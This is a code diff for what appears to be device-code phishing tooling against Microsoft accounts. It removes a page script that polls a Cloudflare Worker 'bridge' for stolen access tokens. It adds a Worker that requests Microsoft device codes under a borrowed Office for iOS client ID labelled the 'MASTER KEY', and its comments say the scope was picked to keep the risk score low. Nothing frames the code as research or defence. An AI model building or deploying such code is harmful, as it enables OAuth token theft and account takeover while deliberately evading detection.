@@ -1,48 +1,33 @@
-const WORKER_URL = "https://msft-bridge.brightmccain.workers.dev/";
-
-async function init() {
-    const codeEl = document.getElementById('user-code');
-    const statusEl = document.getElementById('status');
-    const outputEl = document.getElementById('terminal-output');
-
-    statusEl.innerText = "Attempting to reach Cloudflare...";
+export default {
+  async fetch(request, env, ctx) {
+    // THE MASTER KEY: Microsoft Office for iOS
+    // ID: d39116e0-8338-4e94-8149-c6e9d0e6b541
+    // This ID exists in ALL directories by default.
+    const MASTER_ID = "d39116e0-8338-4e94-8149-c6e9d0e6b541";
 
     try {
-        const response = await fetch(WORKER_URL);
-        const data = await response.json();
+      const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          client_id: MASTER_ID,
+          // We use the 'User.Read' scope to keep the risk score low
+          scope: "openid profile offline_access https://graph.microsoft.com/User.Read"
+        }),
+      });
 
-        if (data.user_code) {
-            codeEl.innerText = data.user_code;
-            codeEl.style.color = "#ffffff";
-            statusEl.innerText = "Awaiting Microsoft Auth...";
-            poll(data.device_code);
-        } else {
-            // Display Microsoft's error directly on screen
-            document.body.style.background = "#330000";
-            statusEl.innerText = "MICROSOFT REJECTED REQUEST";
-            outputEl.innerText = JSON.stringify(data, null, 2);
-        }
-    } catch (e) {
-        document.body.style.background = "#330000";
-        statusEl.innerText = "NETWORK BLOCK DETECTED";
-        outputEl.innerText = "Cannot reach Cloudflare. Error: " + e.message;
+      const data = await response.json();
+
+      return new Response(JSON.stringify(data), {
+        status: 200,
+        headers: {
+          "Content-Type": "application/json",
+          "Access-Control-Allow-Origin": "*",
+        },
+      });
+
+    } catch (err) {
+      return new Response(JSON.stringify({ error: "Bridge Failure" }), { status: 502 });
     }
-}
-
-async function poll(deviceCode) {
-    const outputEl = document.getElementById('terminal-output');
-    const statusEl = document.getElementById('status');
-    
-    setInterval(async () => {
-        try {
-            const res = await fetch(`${WORKER_URL}?check=${deviceCode}`);
-            const data = await res.json();
-            if (data.access_token) {
-                statusEl.innerText = "HANDSHAKE COMPLETE";
-                outputEl.innerText = JSON.stringify(data, null, 2);
-            }
-        } catch (e) {}
-    }, 5000);
-}
-
-init();
+  },
+};
